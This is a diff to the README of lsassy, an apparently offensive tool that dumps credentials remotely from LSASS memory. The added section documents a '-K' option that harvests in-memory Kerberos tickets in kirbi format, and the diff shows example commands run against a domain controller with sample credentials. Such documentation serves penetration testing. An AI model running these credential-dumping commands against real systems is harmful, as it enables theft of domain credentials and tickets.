@@ -189,6 +189,14 @@ For example:
 lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local --parse-only --dump-path "/Windows/Temp" --dump-name "lsass.dmp"
 ```
 
+### Kerberos tickets harvesting
+
+You can extract in-memory Kerberos tickets by using `-K [directory]` or `--kerberos-dir [directory]` parameter. It will extract and save Kerberos tickets in `kirbi` format in the provided output directory. If this directory doesn't exist, the tool will attempt to create it before outputing tickets.
+
+```bash
+lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -K '/tmp/kerberos_tickets'
+```
+
 ### Authentication methods
 
 There are three different ways to authenticate against remote targets using **lsassy**. The only requirement is that the user needs to have local administration rights on the remote targets.
